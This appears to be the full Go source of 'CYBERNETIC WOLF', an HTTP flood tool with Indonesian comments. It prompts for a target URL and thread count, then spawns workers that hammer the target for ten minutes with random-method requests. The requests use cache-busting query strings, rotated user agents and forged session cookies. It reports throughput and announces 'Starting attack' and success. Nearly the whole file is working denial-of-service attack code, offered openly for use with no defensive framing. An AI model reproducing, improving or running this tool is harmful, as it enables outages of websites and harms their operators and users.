package main

import (
	"bufio"
	"context"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"os"
	"sort"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/sirupsen/logrus"
	"golang.org/x/term"
	"golang.org/x/time/rate"
	"unicode/utf8"
)

var randomBufferPool = sync.Pool{
	New: func() interface{} {
		return make([]byte, 0, 64)
	},
}

const statsFlushThreshold int64 = 128

type requestStats struct {
	success int64
	failure int64
}

func (s *requestStats) add(success, failure int64) {
	if success > 0 {
		atomic.AddInt64(&s.success, success)
	}
	if failure > 0 {
		atomic.AddInt64(&s.failure, failure)
	}
}

func (s *requestStats) load() (int64, int64) {
	return atomic.LoadInt64(&s.success), atomic.LoadInt64(&s.failure)
}

func loadUserAgents(filePath string) ([]string, error) {
	file, err := os.Open(filePath)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var userAgents []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" {
			userAgents = append(userAgents, line)
		}
	}
	if err := scanner.Err(); err != nil {
		return nil, err
	}
	return userAgents, nil
}

func randomString(r *rand.Rand, length int) string {
	if length <= 0 {
		return ""
	}
	// ✅ FIX: Pastikan angka 0-9 lengkap termasuk '7'
	const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	buf := randomBufferPool.Get().([]byte)
	if cap(buf) < length {
		buf = make([]byte, length)
	}
	buf = buf[:length]

	for i := 0; i < length; i++ {
		buf[i] = chars[r.Intn(len(chars))]
	}

	s := string(buf)
	randomBufferPool.Put(buf[:0])
	return s
}

func createHttpClient() *http.Client {
	transport := &http.Transport{
		IdleConnTimeout:       30 * time.Second,
		MaxIdleConns:          1000,
		MaxIdleConnsPerHost:   1000,
		ExpectContinueTimeout: 1 * time.Second,
		DisableKeepAlives:     false,
		DisableCompression:    true,
		ForceAttemptHTTP2:     true,
		MaxConnsPerHost:       0,
		DialContext: (&net.Dialer{
			Timeout:   10 * time.Second,
			KeepAlive: 30 * time.Second,
			DualStack: true,
		}).DialContext,
	}
	return &http.Client{Transport: transport, Timeout: 30 * time.Second}
}

func newWorkerLimiter(rateLimit time.Duration) *rate.Limiter {
	if rateLimit <= 0 {
		return nil
	}
	burst := 1
	if rateLimit < time.Second {
		burst = int(time.Second / rateLimit)
		if burst < 5 {
			burst = 5
		} else if burst > 1000 {
			burst = 1000
		}
	}
	return rate.NewLimiter(rate.Every(rateLimit), burst)
}

func sendRequest(
	ctx context.Context,
	workerID int,
	target *url.URL,
	requestPrefix string,
	rateLimit time.Duration,
	userAgents []string,
	stats *requestStats,
	log *logrus.Logger,
	wg *sync.WaitGroup,
) {
	defer wg.Done()
	client := createHttpClient()
	limiter := newWorkerLimiter(rateLimit)

	seed := time.Now().UnixNano() ^ int64(workerID)<<16
	r := rand.New(rand.NewSource(seed))

	cookieURL := new(url.URL)
	*cookieURL = *target

	jar, err := cookiejar.New(nil)
	if err != nil {
		log.WithError(err).Warn("worker failed to create cookie jar")
		return
	}
	client.Jar = jar
	jar.SetCookies(cookieURL, []*http.Cookie{
		{Name: "session", Value: randomString(r, 32)},
		{Name: "visitor", Value: randomString(r, 16)},
	})

	methods := []string{"GET", "POST", "HEAD", "OPTIONS"}

	localSuccess, localFailure := int64(0), int64(0)
	flushStats := func() {
		if localSuccess != 0 || localFailure != 0 {
			stats.add(localSuccess, localFailure)
			localSuccess, localFailure = 0, 0
		}
	}
	defer flushStats()

	for {
		if ctx.Err() != nil {
			return
		}

		if limiter != nil {
			if err := limiter.Wait(ctx); err != nil {
				return
			}
		}

		method := methods[r.Intn(len(methods))]
		fullURL := requestPrefix + randomString(r, 8)

		req, err := http.NewRequest(method, fullURL, nil)
		if err != nil {
			localFailure++
			if localSuccess+localFailure >= statsFlushThreshold {
				flushStats()
			}
			continue
		}

		req = req.WithContext(ctx)
		req.Header.Set("User-Agent", userAgents[r.Intn(len(userAgents))])
		req.Header.Set("Accept", "*/*")
		req.Header.Set("Connection", "keep-alive")
		req.Header.Set("Cache-Control", "no-cache")
		req.Header.Set("X-Requested-With", "XMLHttpRequest")

		resp, err := client.Do(req)
		if err != nil {
			localFailure++
			if localSuccess+localFailure >= statsFlushThreshold {
				flushStats()
			}
			continue
		}

		_, _ = io.Copy(io.Discard, resp.Body)
		resp.Body.Close()

		if resp.StatusCode >= 200 && resp.StatusCode < 300 {
			localSuccess++
		} else {
			localFailure++
		}

		if localSuccess+localFailure >= statsFlushThreshold {
			flushStats()
		}
	}
}

func monitorProgress(ctx context.Context, log *logrus.Logger, stats *requestStats) {
	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()
	var prevSuccess, prevFailure int64
	for {
		select {
		case <-ctx.Done():
			totalSuccess, totalFailure := stats.load()
			log.WithFields(logrus.Fields{
				"success_total":  totalSuccess,
				"failure_total":  totalFailure,
				"requests_total": totalSuccess + totalFailure,
			}).Info("Request throughput monitor stopped")
			return
		case <-ticker.C:
			totalSuccess, totalFailure := stats.load()
			deltaSuccess := totalSuccess - prevSuccess
			deltaFailure := totalFailure - prevFailure
			prevSuccess = totalSuccess
			prevFailure = totalFailure

			if deltaSuccess == 0 && deltaFailure == 0 {
				continue
			}

			log.WithFields(logrus.Fields{
				"success_total": totalSuccess,
				"failure_total": totalFailure,
				"success_rps":   deltaSuccess,
				"failure_rps":   deltaFailure,
				"requests_rps":  deltaSuccess + deltaFailure,
			}).Info("Request throughput (last 1s)")
		}
	}
}

func workerPool(ctx context.Context, numWorkers int, targetURL string, rateLimit time.Duration, log *logrus.Logger, userAgents []string) {
	parsedURL, err := url.Parse(targetURL)
	if err != nil {
		log.WithError(err).Error("salah target URL")
		return
	}
	requestPrefix := targetURL
	if strings.Contains(targetURL, "?") {
		requestPrefix += "&rand="
	} else {
		requestPrefix += "?rand="
	}

	stats := &requestStats{}
	var wg sync.WaitGroup

	derivedCtx, cancel := context.WithCancel(ctx)
	defer cancel()

	go monitorProgress(derivedCtx, log, stats)

	for i := 0; i < numWorkers; i++ {
		wg.Add(1)
		go sendRequest(derivedCtx, i, parsedURL, requestPrefix, rateLimit, userAgents, stats, log, &wg)
	}

	wg.Wait()
	cancel()

	successTotal, failureTotal := stats.load()
	log.WithFields(logrus.Fields{
		"success_total":  successTotal,
		"failure_total":  failureTotal,
		"requests_total": successTotal + failureTotal,
	}).Info("Workers finished")
}

func promptUserInput(promptText string) string {
	reader := bufio.NewReader(os.Stdin)
	fmt.Print(promptText)
	input, _ := reader.ReadString('\n')
	return strings.TrimSpace(input)
}

// ================= BANNER =================
func printBanner() {
	
	banner := `p         ,
                  ▐█▌¿      ╓▓▄
                  ▓█▓▓▄    ╓▓█▓▄
                 ║▌█▓▓▓▌p ╓▓▓██▓p                    ,╓╓¿
                .╫███▓▌░╠▓▄▓▄▄▓▓▓▓▓Φ▄▄,      ,,,▄▄▓█▓▓▌
                ║▌█▄▓██▓░▓▓██▓████▓▓▓▀▀▓▓▓▓▓▓▓▓▓█▓██▓▓▓▓▌
                ████▌▀██╬▓██████▓▓▓▓▓▄╬╣▓▓██████████▓▓▓▓⌐
              «▓█████▌║▓██████▓▓▓▓▓▓▓▓▓▓███████████▓▓▓▓▌
            ,▄▓████▄▓█▓████▓█████████████████████▓▓█▓▓▌
           "╙└▄▓▓██▄▀███▓╫▓█████▓███████████▓▓█▓▓▓▀╜╙
            ╓▄╬▓█████████▓▓████▓▓▓╫▓██████▓▓▓██▌╙
          ,▓▓▓▓██▓▌▓███▓▓▓██▓▓▓▓▓▓██████████▓▌└
    ¥Φw  æ▀▀▓██████▄ ▀██▓▓▓██▓▓▓█████▓██▌╫▓▌Ñ
        ╓▄▓▓██████▀█W  ╙███▀▓█▌▓▌▓▓▀╫▓█╫╫▀╫╫
         ▄██████▓▄▄▓▌█▄ ╙└]▓▌╫╫▓▓╫▓╫██╫╫╫╫Ñ╙
       ╓▓███████████▓▄▀▓▄▌▓██▓╫▓█▌╫╫▀╫╫╣╫╫╫
    ,▄▓██▀▓███████████▌Ñ▀╫▓███▓╫╫╫▓╫╫╫╫N╟╬╨Φ
   "╙└    ╙╙╙█████████╫╫╫N▐╨╫▀█▓╫╫╫╫╫╫╫╫ ▓╬╫Ñ,
            ▄████╓▀███▌╫▄╫╬▀▓▄╩▀▀▓╫╫╫W´"ⁿ╙▓▓▓╫N
            ▓███▓█▓▓███▓█▓▄╫▀█▓▄╨╩╫╫╫╫N ▓▄▓▌╙▀▀Φ⌐
         ╖, ╙██▌▀██M████████▓▓███▄Å╬╫╫╫⌐▓▓▓▓▄
          ▀N ▀█   ` + "`" + `▄▌██████████████▓▌╩╫D██▀▓▓⌐
              ▌    ╙╨╙████████████▓██▌╫▓██H ▀▌
                   Φ▄µ ╙▀████████▀█▓▓▓K▀██▌  ╙φ
                    ▓██▓▄ ╙███████▄╙▓██▓███
                     ▀███▓ ▀███▀███▄,└▀████▄
                        ╙▀▌ ▓██▌ ▓████▓▓██▌▀⌐
                             ███▄ ████████`

	termWidth, _, err := term.GetSize(int(os.Stdout.Fd()))
	if err != nil || termWidth <= 0 {
		termWidth = 80
	}

	maxRuneLen := 0
	for _, line := range strings.Split(banner, "\n") {
		if l := utf8.RuneCountInString(line); l > maxRuneLen {
			maxRuneLen = l
		}
	}

	for _, line := range strings.Split(banner, "\n") {
		if termWidth > maxRuneLen {
			padding := strings.Repeat(" ", (termWidth-maxRuneLen)/2)
			fmt.Println(padding + line)
		} else {
			fmt.Println(line)
		}
	}
}
// ================= END BANNER =================

type ListFormatter struct{}

func (f *ListFormatter) Format(entry *logrus.Entry) ([]byte, error) {
	timestamp := entry.Time.Format("15:04:05")
	level := strings.ToUpper(entry.Level.String())

	// Format Header Log: [JAM] LEVEL: Pesan
	// Menggunakan ANSI color sederhana (Cyan untuk Level)
	msg := fmt.Sprintf("\033[90m[%s]\033[0m \033[36m%s\033[0m: %s\n", timestamp, level, entry.Message)

	// Sortir keys agar urutan informasi tidak berubah-ubah
	keys := make([]string, 0, len(entry.Data))
	for k := range entry.Data {
		keys = append(keys, k)
	}
	sort.Strings(keys)

	// List data menurun kebawah
	for _, k := range keys {
		msg += fmt.Sprintf("  \033[94m└─\033[0m %-18s : %v\n", k, entry.Data[k])
	}

	return []byte(msg + "\n"), nil
}

func main() {
	printBanner()
	fmt.Println("=====+CYBERNETIC WOLF+=====")
	fmt.Println()

	log := logrus.New()
	log.SetFormatter(&ListFormatter{})
	log.SetOutput(os.Stdout)
	log.SetLevel(logrus.InfoLevel)

	targetURL := promptUserInput("target URL: ")
	if targetURL == "" {
		log.Fatal("masukan url dg benar")
	}

	threadsInput := promptUserInput("threads: ")
	numThreads, err := strconv.Atoi(strings.TrimSpace(threadsInput))
	if err != nil || numThreads <= 0 {
		log.WithError(err).Fatal("threads salah")
	}

	rateLimitInput := promptUserInput("rate limit (misal: 100ms): ")
	var rateLimit time.Duration
	if strings.TrimSpace(rateLimitInput) != "" {
		rateLimit, err = time.ParseDuration(rateLimitInput)
		if err != nil {
			log.WithError(err).Fatal("rate limit salah")
		}
	}

	userAgentFile := "user_agents.txt"
	userAgents, err := loadUserAgents(userAgentFile)
	if err != nil {
		log.WithError(err).Fatal("tidak ditemukan user-agent file: user_agents.txt")
	}
	if len(userAgents) == 0 {
		log.Fatal("user agent list kosong")
	}

	log.WithFields(logrus.Fields{
		"url":                 targetURL,
		"numThreads":          numThreads,
		"rateLimit_perWorker": rateLimit,
		"userAgents":          len(userAgents),
	}).Info("Starting attack")

	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Minute)
	defer cancel()

	workerPool(ctx, numThreads, targetURL, rateLimit, log, userAgents)
	log.Info("Attack beres hurraaaaa")
}